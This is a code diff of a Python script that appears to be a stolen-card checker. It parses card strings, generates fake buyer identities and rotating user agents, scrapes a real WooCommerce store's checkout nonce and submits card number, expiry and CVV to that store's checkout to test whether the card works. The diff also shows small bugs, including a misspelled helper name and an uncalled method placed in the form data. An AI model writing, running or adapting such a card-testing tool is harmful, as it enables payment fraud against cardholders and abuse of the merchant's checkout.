@@ -11,7 +11,7 @@ import names
 from bs4 import BeautifulSoup
 import uuid
 from fake_useragent import UserAgent
-def parseX(data, first, last):
+def paserX(data, first, last):
   try:
     start = data.index( first ) + len( first )
     end = data.index( last, start )
@@ -19,15 +19,44 @@ def parseX(data, first, last):
   except ValueError:
     return None 
 
-@dataclass
+def generar_codigo_session():
+    codigo_session = str(uuid.uuid4())
+    return codigo_session
+
+def find_between(data, first, last):
+  try:
+    start = data.index( first ) + len( first )
+    end = data.index( last, start )
+    return data[start:end]
+  except ValueError:
+    return None  
+
 class ebichazw:
-    def main(self, card):
+    def __init__(self, tarjeta):
+        partes = tarjeta.split("|")
+        
+        self.tarjeta = tarjeta
+        if len(partes) == 4:
+            self.cc = partes[0]
+            self.mes = partes[1]
+            self.ano = partes[2]
+            self.cvv = partes[3]  
+             
+    def detectar_tipo_tarjeta(self):
+        if self.cc.startswith("4"):
+            return "Visa"
+        elif self.cc.startswith("5"):
+            return "MasterCard"
+        elif self.cc.startswith("3"):
+            return "American Express"
+        elif self.cc.startswith("6"):
+            return "Discover"
+        else:
+            return "Desconocido"
+          
+    def main(self):
         try:
-            self.card = card
-            self.ccs = card.split('|')
-            if self.ccs[0].startswith("4"): self.brand = "Visa"
-            if self.ccs[0].startswith("3"): self.brand = "American Express"
-            elif self.ccs[0].startswith("5"): self.brand = "MasterCard"
+            session = requests.Session()
             def generar_correo():
                 return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
             CorreoRand = generar_correo()
@@ -35,7 +64,6 @@ class ebichazw:
             username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
             Agent = UserAgent().random
 
-            session = Session()
             headers = {
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                 'Accept-Language': 'es-ES,es;q=0.8',
@@ -131,7 +159,7 @@ class ebichazw:
             }
 
             response = session.get('https://transdatainc.com/checkout/', headers=headers).text
-            chekout = parseX(response, 'name="woocommerce-process-checkout-nonce" value="', '"')
+            chekout = paserX(response, 'name="woocommerce-process-checkout-nonce" value="', '"')
             print(chekout)
             headers = {
                 'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -156,7 +184,7 @@ class ebichazw:
                 'wc-ajax': 'checkout',
             }
 
-            data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Ftransdatainc.com%2Fproduct-category%2Fabacus%2F&wc_order_attribution_session_start_time=2026-07-28+03%3A52%3A49&wc_order_attribution_session_pages=20&wc_order_attribution_session_count=2&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F150.0.0.0+Safari%2F537.36&billing_first_name=ldfl&billing_last_name=dsdasd&billing_company=ggd&billing_country=US&billing_address_1=moall+del+sol&billing_address_2=sadw&billing_city=guayas&billing_state=NY&billing_postcode=10080&billing_phone=%2B10989861371&billing_email={CorreoRand}&shipping_first_name=ldfl&shipping_last_name=dsdasd&shipping_company=ggd&shipping_country=US&shipping_address_1=moall+del+sol&shipping_address_2=sadw&shipping_city=guayas&shipping_state=NY&shipping_postcode=10080&shipping_phone=%2B10989861371&order_comments=&shipping_method%5B0%5D=free_shipping%3A7&payment_method=ebizcharge&ebizcharge-payment-method=cc&ccholder=ldfl+dsdasd&ccnum={self.ccs[0]}&cardtype={self.brand}&expmonth={self.ccs[1]}&expyear={self.ccs[2]}&cvv={self.ccs[3]}&Is3DS2Enabled=false&surcharge_enabled=&woocommerce-process-checkout-nonce={chekout}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
+            data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Ftransdatainc.com%2Fproduct-category%2Fabacus%2F&wc_order_attribution_session_start_time=2026-07-28+03%3A52%3A49&wc_order_attribution_session_pages=20&wc_order_attribution_session_count=2&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F150.0.0.0+Safari%2F537.36&billing_first_name=ldfl&billing_last_name=dsdasd&billing_company=ggd&billing_country=US&billing_address_1=moall+del+sol&billing_address_2=sadw&billing_city=guayas&billing_state=NY&billing_postcode=10080&billing_phone=%2B10989861371&billing_email={CorreoRand}&shipping_first_name=ldfl&shipping_last_name=dsdasd&shipping_company=ggd&shipping_country=US&shipping_address_1=moall+del+sol&shipping_address_2=sadw&shipping_city=guayas&shipping_state=NY&shipping_postcode=10080&shipping_phone=%2B10989861371&order_comments=&shipping_method%5B0%5D=free_shipping%3A7&payment_method=ebizcharge&ebizcharge-payment-method=cc&ccholder=ldfl+dsdasd&ccnum={self.cc}&cardtype={self.detectar_tipo_tarjeta}&expmonth={self.mes}&expyear={self.ano}&cvv={self.cvv}&Is3DS2Enabled=false&surcharge_enabled=&woocommerce-process-checkout-nonce={chekout}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
 
             response = session.post('https://transdatainc.com/', params=params, headers=headers, data=data)
             j = response.json()
